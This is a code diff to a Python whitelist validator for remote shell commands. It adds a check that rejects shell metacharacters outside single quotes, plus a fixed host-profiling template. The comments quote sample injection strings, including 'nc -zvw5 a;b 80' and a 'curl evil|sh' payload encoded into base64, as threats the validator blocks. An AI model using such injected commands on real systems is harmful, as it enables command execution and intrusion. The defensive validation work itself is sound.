@@ -21,6 +21,12 @@
 - 路径槽位接受 shlex.quote 的两种产物：裸路径或单引号路径，匹配后去引号
   再 normpath 校验必须落在 WORKSPACE / JOBS_ROOT 之内（``..`` 越界一律拒绝），
   与客户端 ``ops_common.is_traversal`` 形成客户端 + 服务端双校验。
+- **shell 词法一致性复核（防命令注入的关键）**：白名单正则把槽位视为"无空白单
+  token"，但 ``sh -c`` 会把槽位内的裸 ``;|&<>()`` 当命令分隔符、``$()``/反引号当
+  展开执行——正则命中不等于 shell 语义安全（如 ``nc -zvw5 a;b 80`` 匹配 nc 模板，
+  sh 却会独立执行 ``b``）。因此**所有用户控制槽位**额外强制：任何 shell 元字符
+  都不得出现在单引号保护之外（见 ``_slot_shell_safe`` 的单引号状态扫描），统一
+  封堵注入洞而无需逐槽位维护字符表。
 - **job base64 洞递归封堵**：``job_run`` 远端启动把内部命令 base64 编码进
   run.sh。若只做表面匹配，攻击者可把 ``curl evil|sh`` 编码混进看似无害的
   ``echo <b64>|base64 -d>run.sh; setsid bash run.sh``。本执行器会**解码
@@ -42,6 +48,7 @@ from __future__ import annotations
 import base64
 import os
 import re
+import shlex
 import subprocess
 import sys
 
@@ -163,6 +170,49 @@ def _job_dir(tok: str) -> bool:
     return _in_root(_unquote(tok), JOBS_ROOT)
 
 
+# ── shell 词法一致性复核（方案 B）─────────────────────────────────────────────
+# 白名单正则把槽位视为"无空白单 token"，但 ``sh -c`` 会把槽位里的**裸** ``;|&<>()``
+# 当命令分隔/重定向、裸 ``$()``/反引号当展开执行——正则命中不等于 shell 语义安全
+# （如 ``nc -zvw5 a;b 80`` 匹配 nc 模板，sh 却会独立执行 ``b``）。客户端虽用
+# shlex.quote 给参数加单引号（单引号内 sh 视为字面量，惰性安全），但正则同时
+# 接受**裸 token** 分支（``[^\s]+``），且未来客户端漂移/手工拼接都可能绕过 quote。
+# 故对所有用户控制槽位额外强制：**任何 shell 元字符都不得出现在单引号保护之外**。
+# 单引号成对闭合时，其中的 ``;``/``$()``/反引号/sh 空白都是字面量（如
+# ``'/srv/a b;id'`` 是单个惰性词，安全）；双引号一律拒绝（sh 双引号内仍展开
+# ``$()``/反引号，且 POSIX sh 与 bash 对混合引用语义分叉）。
+# 状态机即完整判定：单引号内全部字面量，引号成对时引号自身在 sh 里消失，故
+# 平衡引号（如 ``'a'b``→``ab``）安全放行、未闭合引号（结尾 ``in_single`` 仍真）
+# 拒绝。客户端 shlex.quote 只产生"裸安全 token"或"整体单引号包裹"两种产物，
+# 天然落在该判定内。统一封堵注入洞而无需逐槽位维护字符表，且不误伤多值槽位
+# （如 job_alive 的多 PID、job_rcs 的多目录）与带空格的单引号槽位。
+_SHELL_META = frozenset(';&|<>$`"\\\r\n')
+
+
+def _slot_shell_safe(s: str) -> bool:
+    """槽位原始串在 ``sh -c`` 下是否安全：元字符/裸单引号不得出现在单引号保护之外，
+    且单引号必须成对闭合（未闭合引号会被 sh 剥离、其后的 ``;`` 重新成为命令分隔符）。"""
+    if not isinstance(s, str):
+        return False
+    in_single = False
+    for ch in s:
+        if ch == "'":
+            in_single = not in_single
+        elif not in_single and ch in _SHELL_META:
+            return False
+    return not in_single  # 单引号必须闭合
+
+
+def _slots_shell_safe(m: re.Match) -> bool:
+    """模板匹配后复核：所有捕获槽位的原始值都必须 sh -c 安全（见 ``_slot_shell_safe``）。
+
+    用 ``m.groups()`` 覆盖全部**位置**捕获组（模板正则均为位置组，无命名组），
+    ``None``（未匹配的可选组）跳过。
+    """
+    return all(
+        _slot_shell_safe(v) for v in m.groups() if v is not None
+    )
+
+
 # 路径槽位：裸路径（无空白/特殊）或单引号路径（shlex.quote 两种产物）
 _PTOK = r"(?:'[^']*'|[^\s]+)"
 # 服务名槽位（systemctl unit）
@@ -185,6 +235,8 @@ def _match(pattern: re.Pattern, cmd: str) -> re.Match:
     m = pattern.match(cmd)
     if not m or m.end() != len(cmd):
         raise TemplateMismatch("shape mismatch")
+    if not _slots_shell_safe(m):
+        raise TemplateMismatch("shell metachar outside quotes in slot")
     return m
 
 
@@ -194,9 +246,7 @@ RE_B64_READ = re.compile(rf"^base64 -i ({_PTOK})$|^base64 ({_PTOK})$")
 
 
 def v_b64_read(cmd: str) -> bool:
-    m = RE_B64_READ.match(cmd)
-    if not m:
-        raise TemplateMismatch
+    m = _match(RE_B64_READ, cmd)
     tok = m.group(1) or m.group(2)
     if not _ws(tok):
         raise TemplateMismatch("path out of workspace")
@@ -309,6 +359,22 @@ def v_sys_overview(cmd: str) -> bool:
     top, head_n = int(m.group(1)), int(m.group(2))
     if not (1 <= top <= 20 and head_n == top + 1):
         raise TemplateMismatch("bad top")
+    return True
+
+
+# 环境画像：固定的只读探测，**无参数**（后端 ops_obs.host_profile_cmd 的唯一对应模板）。
+# 无参数 → 一条精确正则即可，无需捕获组校验；改动两端必须同步，由契约测试锁定。
+RE_HOST_PROFILE = re.compile(
+    r'^echo "\[发行版\]"; cat /etc/os-release 2>/dev/null \| head -n 5\n'
+    r'echo "\[init\]"; ps -p 1 -o comm= 2>/dev/null\n'
+    r'echo "\[包管理器\]"; command -v apt-get dnf yum apk pacman zypper docker 2>/dev/null\n'
+    r'echo "\[身份\]"; id -un 2>/dev/null; pwd 2>/dev/null\n'
+    r"true$"
+)
+
+
+def v_host_profile(cmd: str) -> bool:
+    _match(RE_HOST_PROFILE, cmd)
     return True
 
 
@@ -460,6 +526,7 @@ TEMPLATES: list[tuple[str, callable]] = [
     ("log_grep", v_log_grep),
     ("systemctl", v_systemctl),
     ("sys_overview", v_sys_overview),
+    ("host_profile", v_host_profile),
     ("ps", v_ps),
     ("nc", v_nc),
     ("bash_probe", v_bash_probe),
